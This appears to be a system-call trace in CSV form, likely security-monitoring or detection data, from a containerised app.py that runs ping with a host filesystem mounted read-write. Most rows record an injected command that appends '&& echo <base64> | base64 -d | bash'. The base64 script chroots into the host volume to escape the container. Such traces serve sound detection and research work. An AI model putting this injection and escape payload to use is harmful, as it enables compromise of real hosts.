evt_time,syscall_type,container_mounts,proc_args,proc_nthreads,proc_nchilds,proc_fdopencount,proc_vmsize,evt_args
12:44:29.502583699,poll,/:/host:rw:true:rslave,app.py,2,1,6,149804,res=0 fds=
12:44:29.502626207,poll,/:/host:rw:true:rslave,app.py,2,1,6,149804,fds=3:41 timeout=500
12:44:30.002962089,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=-11(EAGAIN) size=192 data=NULL tuple=NULL
12:44:30.002975205,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1) size=64 tuple=0.0.0.0:1->127.0.0.1:0
12:44:30.003049522,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=64 data=..Y.......lc............................ !#$%&'()*+
12:44:30.003060913,setitimer,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
12:44:30.003065581,setitimer,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
12:44:30.003067495,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
12:44:30.003074407,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=84 size=84 data=E..Tm...@.............a.......lc............................ !#$%&'()*+
12:44:30.003092000,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[23958]) size=57
12:44:30.003139212,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=57 data=64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.065 ms.
12:44:30.003144552,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[23958]) size=1
12:44:30.003147527,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=1 data=.
12:44:30.003163154,read,/:/host:rw:true:rslave,app.py,2,0,6,149804,res=58 data=64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.065 ms..
12:44:30.003163154,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[23958]) size=147
12:44:30.003164458,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=147 data=--- 127.0.0.1 ping statistics ---.4 packets transmitted
12:44:30.003167424,exit_group,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
12:44:30.003172952,read,/:/host:rw:true:rslave,app.py,2,0,6,149804,fd=5(<p>pipe:[23958]) size=7914
12:44:30.003177300,read,/:/host:rw:true:rslave,app.py,2,0,6,149804,res=147 data=--- 127.0.0.1 ping statistics ---.4 packets transmitted
12:44:30.003179183,read,/:/host:rw:true:rslave,app.py,2,0,6,149804,fd=5(<p>pipe:[23958]) size=7767
12:44:30.003437803,poll,/:/host:rw:true:rslave,app.py,2,1,6,149804,res=0 fds=
12:44:30.003488867,poll,/:/host:rw:true:rslave,app.py,2,1,6,149804,fds=3:41 timeout=500
12:44:30.005684668,wait4,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
12:44:30.005719582,pipe,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
12:44:30.005729400,pipe,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,res=0 fd1=3(<p>) fd2=4(<p>) ino=20392
12:44:30.005731624,clone,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,
12:44:30.005824399,clone,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,res=13 exe=/bin/sh args=-c.ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3Jlc... tid=2839(sh) pid=2839(sh) ptid=2838(python3) cwd= fdlimit=1048576 pgft_maj=0 pgft_min=96 vm_size=4504 vm_rss=748 vm_swap=0 comm=sh cgroups=cpuset=/docker/4dfd817f85f2fc459c280bfabcc5f61b18be06fc3dac94790b29b16fad7a63... flags=562036736(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID) uid=1000 gid=1000 vtid=11 vpid=11
12:44:30.005864517,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,fd=4(<p>)
12:44:30.005864517,clone,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,res=0 exe=/bin/sh args=-c.ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3Jlc... tid=2890(sh) pid=2890(sh) ptid=2839(sh) cwd= fdlimit=1048576 pgft_maj=0 pgft_min=1 vm_size=4504 vm_rss=84 vm_swap=0 comm=sh cgroups=cpuset=/docker/4dfd817f85f2fc459c280bfabcc5f61b18be06fc3dac94790b29b16fad7a63... flags=562036736(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID) uid=1000 gid=1000 vtid=13 vpid=13
12:44:30.005865725,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,res=0
12:44:30.005874371,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,
12:44:30.005900899,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=-2(ENOENT) path=/usr/local/sbin/base64
12:44:30.005903564,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,
12:44:30.005912902,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=-2(ENOENT) path=/usr/local/bin/base64
12:44:30.005915065,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,
12:44:30.005933419,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=-2(ENOENT) path=/usr/sbin/base64
12:44:30.005935343,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,
12:44:30.005951206,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,fd=3(<p>)
12:44:30.005954292,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,res=0
12:44:30.005955845,dup2,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,fd=4(<p>)
12:44:30.005957919,dup2,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=1(<p>) oldfd=4(<p>) newfd=1(<p>)
12:44:30.005959752,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,fd=4(<p>)
12:44:30.005960864,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=0
12:44:30.006005055,write,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,fd=1(<p>) size=297
12:44:30.006012008,write,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,res=297 data=IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBh
12:44:30.006021295,exit_group,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
12:44:30.006332147,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=0 path=/usr/bin/base64
12:44:30.006350882,pipe,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,
